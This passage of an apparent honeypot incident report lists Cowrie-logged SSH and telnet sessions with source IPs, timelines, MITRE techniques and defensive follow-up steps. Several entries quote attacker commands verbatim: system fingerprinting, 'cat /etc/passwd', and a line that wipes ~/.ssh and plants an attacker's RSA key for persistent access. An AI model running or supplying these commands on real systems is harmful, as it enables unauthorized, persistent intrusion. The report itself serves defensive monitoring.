| `2026-08-10 03:15:53` | `cowrie.command.failed` |
| `2026-08-10 03:15:53` | `cowrie.log.closed` |
| `2026-08-10 03:15:54` | `cowrie.session.params` |
| `2026-08-10 03:15:54` | `cowrie.command.input` |
| `2026-08-10 03:15:54` | `cowrie.log.closed` |
| `2026-08-10 03:15:55` | `cowrie.session.params` |
| `2026-08-10 03:15:55` | `cowrie.command.input` |
| `2026-08-10 03:15:55` | `cowrie.log.closed` |
| `2026-08-10 03:15:57` | `cowrie.session.params` |
| `2026-08-10 03:15:57` | `cowrie.command.input` |
| `2026-08-10 03:15:57` | `cowrie.command.failed` |
| `2026-08-10 03:15:57` | `cowrie.command.failed` |
| `2026-08-10 03:16:58` | `cowrie.session.params` |
| `2026-08-10 03:16:58` | `cowrie.command.input` |
| `2026-08-10 03:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c7cffe59dc2

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-08-10 03:24 |
| **Last Seen** | 2026-08-10 03:29 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:24:47` | `cowrie.session.connect` |
| `2026-08-10 03:24:47` | `cowrie.client.version` |
| `2026-08-10 03:24:47` | `cowrie.client.kex` |
| `2026-08-10 03:24:49` | `cowrie.login.success` |
| `2026-08-10 03:24:50` | `cowrie.direct-tcpip.request` |
| `2026-08-10 03:29:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2124a0984aa

| Field | Detail |
|---|---|
| **Source IP** | `14.194.128[.]158` |
| **First Seen** | 2026-08-10 03:26 |
| **Last Seen** | 2026-08-10 03:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:26:53` | `cowrie.session.connect` |
| `2026-08-10 03:26:54` | `cowrie.client.version` |
| `2026-08-10 03:26:54` | `cowrie.client.kex` |
| `2026-08-10 03:26:55` | `cowrie.login.success` |
| `2026-08-10 03:26:56` | `cowrie.direct-tcpip.request` |
| `2026-08-10 03:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.128[.]158` to AbuseIPDB if not already reported
- [ ] Block `14.194.128[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0607e96cff8a

| Field | Detail |
|---|---|
| **Source IP** | `111.42.175[.]101` |
| **First Seen** | 2026-08-10 03:27 |
| **Last Seen** | 2026-08-10 03:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:27:01` | `cowrie.session.connect` |
| `2026-08-10 03:27:02` | `cowrie.client.version` |
| `2026-08-10 03:27:02` | `cowrie.client.kex` |
| `2026-08-10 03:27:04` | `cowrie.login.success` |
| `2026-08-10 03:27:05` | `cowrie.direct-tcpip.request` |
| `2026-08-10 03:27:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.42.175[.]101` to AbuseIPDB if not already reported
- [ ] Block `111.42.175[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e7b06e92f16

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-10 03:38 |
| **Last Seen** | 2026-08-10 03:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:38:09` | `cowrie.session.connect` |
| `2026-08-10 03:38:09` | `cowrie.client.version` |
| `2026-08-10 03:38:09` | `cowrie.client.kex` |
| `2026-08-10 03:38:10` | `cowrie.login.success` |
| `2026-08-10 03:38:10` | `cowrie.direct-tcpip.request` |
| `2026-08-10 03:38:10` | `cowrie.direct-tcpip.data` |
| `2026-08-10 03:38:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d0a17ac0eec

| Field | Detail |
|---|---|
| **Source IP** | `207.175.148[.]67` |
| **First Seen** | 2026-08-10 03:40 |
| **Last Seen** | 2026-08-10 03:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:40:03` | `cowrie.session.connect` |
| `2026-08-10 03:40:03` | `cowrie.login.success` |
| `2026-08-10 03:40:03` | `cowrie.session.params` |
| `2026-08-10 03:40:03` | `cowrie.command.input` |
| `2026-08-10 03:40:03` | `cowrie.command.input` |
| `2026-08-10 03:40:03` | `cowrie.command.failed` |
| `2026-08-10 03:40:03` | `cowrie.command.input` |
| `2026-08-10 03:40:03` | `cowrie.log.closed` |
| `2026-08-10 03:40:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.148[.]67` to AbuseIPDB if not already reported
- [ ] Block `207.175.148[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d117f0b77fa0

| Field | Detail |
|---|---|
| **Source IP** | `207.175.148[.]67` |
| **First Seen** | 2026-08-10 03:40 |
| **Last Seen** | 2026-08-10 03:40 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:40:16` | `cowrie.session.connect` |
| `2026-08-10 03:40:16` | `cowrie.login.success` |
| `2026-08-10 03:40:17` | `cowrie.session.params` |
| `2026-08-10 03:40:17` | `cowrie.command.input` |
| `2026-08-10 03:40:17` | `cowrie.command.failed` |
| `2026-08-10 03:40:30` | `cowrie.log.closed` |
| `2026-08-10 03:40:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.148[.]67` to AbuseIPDB if not already reported
- [ ] Block `207.175.148[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b47b6190504

| Field | Detail |
|---|---|
| **Source IP** | `207.175.148[.]67` |
| **First Seen** | 2026-08-10 03:40 |
| **Last Seen** | 2026-08-10 03:40 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:40:18` | `cowrie.session.connect` |
| `2026-08-10 03:40:18` | `cowrie.login.success` |
| `2026-08-10 03:40:19` | `cowrie.session.params` |
| `2026-08-10 03:40:19` | `cowrie.command.input` |
| `2026-08-10 03:40:30` | `cowrie.log.closed` |
| `2026-08-10 03:40:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.148[.]67` to AbuseIPDB if not already reported
- [ ] Block `207.175.148[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f11bd7148a81

| Field | Detail |
|---|---|
| **Source IP** | `119.200.229[.]33` |
| **First Seen** | 2026-08-10 03:48 |
| **Last Seen** | 2026-08-10 03:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:48:47` | `cowrie.session.connect` |
| `2026-08-10 03:48:48` | `cowrie.client.version` |
| `2026-08-10 03:48:48` | `cowrie.client.kex` |
| `2026-08-10 03:48:50` | `cowrie.login.success` |
| `2026-08-10 03:48:51` | `cowrie.direct-tcpip.request` |
| `2026-08-10 03:48:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.200.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `119.200.229[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc3c9735ade5

| Field | Detail |
|---|---|
| **Source IP** | `59.93.36[.]136` |
| **First Seen** | 2026-08-10 03:48 |
| **Last Seen** | 2026-08-10 03:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:48:56` | `cowrie.session.connect` |
| `2026-08-10 03:48:57` | `cowrie.client.version` |
| `2026-08-10 03:48:57` | `cowrie.client.kex` |
| `2026-08-10 03:48:59` | `cowrie.login.success` |
| `2026-08-10 03:49:00` | `cowrie.direct-tcpip.request` |
| `2026-08-10 03:49:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.93.36[.]136` to AbuseIPDB if not already reported
- [ ] Block `59.93.36[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0d74515ea6a

| Field | Detail |
|---|---|
| **Source IP** | `103.83.23[.]169` |
| **First Seen** | 2026-08-10 03:48 |
| **Last Seen** | 2026-08-10 03:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:48:56` | `cowrie.session.connect` |
| `2026-08-10 03:48:56` | `cowrie.client.version` |
| `2026-08-10 03:48:56` | `cowrie.client.kex` |
| `2026-08-10 03:48:58` | `cowrie.login.success` |
| `2026-08-10 03:48:58` | `cowrie.direct-tcpip.request` |
| `2026-08-10 03:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.83.23[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.83.23[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07c630374f4b

| Field | Detail |
|---|---|
| **Source IP** | `207.219.221[.]101` |
| **First Seen** | 2026-08-10 03:53 |
| **Last Seen** | 2026-08-10 03:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:53:42` | `cowrie.session.connect` |
| `2026-08-10 03:53:43` | `cowrie.client.version` |
| `2026-08-10 03:53:43` | `cowrie.client.kex` |
| `2026-08-10 03:53:44` | `cowrie.login.success` |
| `2026-08-10 03:53:44` | `cowrie.direct-tcpip.request` |
| `2026-08-10 03:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.219.221[.]101` to AbuseIPDB if not already reported
- [ ] Block `207.219.221[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b6685f4a08e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-10 03:55 |
| **Last Seen** | 2026-08-10 03:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 03:55:08` | `cowrie.session.connect` |
| `2026-08-10 03:55:08` | `cowrie.client.version` |
| `2026-08-10 03:55:08` | `cowrie.client.kex` |
| `2026-08-10 03:55:09` | `cowrie.login.success` |
| `2026-08-10 03:55:09` | `cowrie.direct-tcpip.request` |
| `2026-08-10 03:55:09` | `cowrie.direct-tcpip.data` |
| `2026-08-10 03:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd293576d993

| Field | Detail |
|---|---|
| **Source IP** | `222.236.155[.]146` |
| **First Seen** | 2026-08-10 04:01 |
| **Last Seen** | 2026-08-10 04:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:01:05` | `cowrie.session.connect` |
| `2026-08-10 04:01:06` | `cowrie.client.version` |
| `2026-08-10 04:01:06` | `cowrie.client.kex` |
| `2026-08-10 04:01:08` | `cowrie.login.success` |
| `2026-08-10 04:01:09` | `cowrie.direct-tcpip.request` |
| `2026-08-10 04:01:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.236.155[.]146` to AbuseIPDB if not already reported
- [ ] Block `222.236.155[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e74d4233255

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:09 |
| **Last Seen** | 2026-08-10 04:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:09:35` | `cowrie.session.connect` |
| `2026-08-10 04:09:35` | `cowrie.client.version` |
| `2026-08-10 04:09:35` | `cowrie.client.kex` |
| `2026-08-10 04:09:38` | `cowrie.login.success` |
| `2026-08-10 04:09:39` | `cowrie.session.params` |
| `2026-08-10 04:09:39` | `cowrie.command.input` |
| `2026-08-10 04:09:39` | `cowrie.command.input` |
| `2026-08-10 04:09:39` | `cowrie.command.input` |
| `2026-08-10 04:09:39` | `cowrie.command.input` |
| `2026-08-10 04:09:39` | `cowrie.command.input` |
| `2026-08-10 04:09:39` | `cowrie.command.success` |
| `2026-08-10 04:09:39` | `cowrie.command.input` |
| `2026-08-10 04:09:39` | `cowrie.command.input` |
| `2026-08-10 04:09:39` | `cowrie.command.input` |
| `2026-08-10 04:09:39` | `cowrie.command.input` |
| `2026-08-10 04:09:40` | `cowrie.log.closed` |
| `2026-08-10 04:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2b7faf6a43e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:12 |
| **Last Seen** | 2026-08-10 04:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:12:04` | `cowrie.session.connect` |
| `2026-08-10 04:12:04` | `cowrie.client.version` |
| `2026-08-10 04:12:04` | `cowrie.client.kex` |
| `2026-08-10 04:12:07` | `cowrie.login.success` |
| `2026-08-10 04:12:09` | `cowrie.session.params` |
| `2026-08-10 04:12:09` | `cowrie.command.input` |
| `2026-08-10 04:12:09` | `cowrie.command.input` |
| `2026-08-10 04:12:09` | `cowrie.command.input` |
| `2026-08-10 04:12:09` | `cowrie.command.input` |
| `2026-08-10 04:12:09` | `cowrie.command.input` |
| `2026-08-10 04:12:09` | `cowrie.command.success` |
| `2026-08-10 04:12:09` | `cowrie.command.input` |
| `2026-08-10 04:12:09` | `cowrie.command.input` |
| `2026-08-10 04:12:09` | `cowrie.command.input` |
| `2026-08-10 04:12:09` | `cowrie.command.input` |
| `2026-08-10 04:12:09` | `cowrie.log.closed` |
| `2026-08-10 04:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1949fb6a39c8

| Field | Detail |
|---|---|
| **Source IP** | `69.6.234[.]27` |
| **First Seen** | 2026-08-10 04:14 |
| **Last Seen** | 2026-08-10 04:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:14:00` | `cowrie.session.connect` |
| `2026-08-10 04:14:00` | `cowrie.client.version` |
| `2026-08-10 04:14:00` | `cowrie.client.kex` |
| `2026-08-10 04:14:00` | `cowrie.login.success` |
| `2026-08-10 04:14:01` | `cowrie.session.params` |
| `2026-08-10 04:14:01` | `cowrie.command.input` |
| `2026-08-10 04:14:01` | `cowrie.command.failed` |
| `2026-08-10 04:14:01` | `cowrie.log.closed` |
| `2026-08-10 04:14:02` | `cowrie.session.params` |
| `2026-08-10 04:14:02` | `cowrie.command.input` |
| `2026-08-10 04:14:02` | `cowrie.session.file_download` |
| `2026-08-10 04:14:02` | `cowrie.log.closed` |
| `2026-08-10 04:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.234[.]27` to AbuseIPDB if not already reported
- [ ] Block `69.6.234[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaa43e4dff43

| Field | Detail |
|---|---|
| **Source IP** | `69.6.234[.]27` |
| **First Seen** | 2026-08-10 04:14 |
| **Last Seen** | 2026-08-10 04:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:14:02` | `cowrie.session.connect` |
| `2026-08-10 04:14:02` | `cowrie.client.version` |
| `2026-08-10 04:14:02` | `cowrie.client.kex` |
| `2026-08-10 04:14:02` | `cowrie.login.success` |
| `2026-08-10 04:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.234[.]27` to AbuseIPDB if not already reported
- [ ] Block `69.6.234[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-440efb76a65c

| Field | Detail |
|---|---|
| **Source IP** | `69.6.234[.]27` |
| **First Seen** | 2026-08-10 04:14 |
| **Last Seen** | 2026-08-10 04:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:14:03` | `cowrie.session.connect` |
| `2026-08-10 04:14:03` | `cowrie.client.version` |
| `2026-08-10 04:14:03` | `cowrie.client.kex` |
| `2026-08-10 04:14:03` | `cowrie.login.success` |
| `2026-08-10 04:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.234[.]27` to AbuseIPDB if not already reported
- [ ] Block `69.6.234[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01dfe974d3c8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 04:14 |
| **Last Seen** | 2026-08-10 04:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:14:32` | `cowrie.session.connect` |
| `2026-08-10 04:14:33` | `cowrie.client.version` |
| `2026-08-10 04:14:33` | `cowrie.client.kex` |
| `2026-08-10 04:14:35` | `cowrie.login.success` |
| `2026-08-10 04:14:36` | `cowrie.session.params` |
| `2026-08-10 04:14:36` | `cowrie.command.input` |
| `2026-08-10 04:14:36` | `cowrie.command.input` |
| `2026-08-10 04:14:36` | `cowrie.command.input` |
| `2026-08-10 04:14:36` | `cowrie.command.input` |
| `2026-08-10 04:14:36` | `cowrie.command.input` |
| `2026-08-10 04:14:36` | `cowrie.command.success` |
| `2026-08-10 04:14:36` | `cowrie.command.input` |
| `2026-08-10 04:14:36` | `cowrie.command.input` |
| `2026-08-10 04:14:36` | `cowrie.command.input` |
| `2026-08-10 04:14:36` | `cowrie.command.input` |
| `2026-08-10 04:14:37` | `cowrie.log.closed` |
| `2026-08-10 04:14:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad7b0b6f2f00

| Field | Detail |
|---|---|
| **Source IP** | `121.40.20[.]65` |
| **First Seen** | 2026-08-10 04:15 |
| **Last Seen** | 2026-08-10 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 04:15:28` | `cowrie.session.connect` |
| `2026-08-10 04:15:28` | `cowrie.telnet.option` |
| `2026-08-10 04:15:28` | `cowrie.telnet.option` |
| `2026-08-10 04:15:28` | `cowrie.login.success` |
| `2026-08-10 04:15:29` | `cowrie.session.params` |
| `2026-08-10 04:15:29` | `cowrie.telnet.option` |
| `2026-08-10 04:15:29` | `cowrie.telnet.option` |
| `2026-08-10 04:15:29` | `cowrie.command.input` |
| `2026-08-10 04:15:29` | `cowrie.command.input` |
| `2026-08-10 04:15:29` | `cowrie.command.input` |
| `2026-08-10 04:15:29` | `cowrie.command.input` |
| `2026-08-10 04:15:29` | `cowrie.command.failed` |
| `2026-08-10 04:15:29` | `cowrie.command.input` |
| `2026-08-10 04:15:29` | `cowrie.command.failed` |
| `2026-08-10 04:15:29` | `cowrie.command.input` |
| `2026-08-10 04:15:29` | `cowrie.command.failed` |
| `2026-08-10 04:15:29` | `cowrie.command.input` |
| `2026-08-10 04:15:29` | `cowrie.command.input` |
| `2026-08-10 04:15:29` | `cowrie.command.input` |
| `2026-08-10 04:15:29` | `cowrie.command.input` |
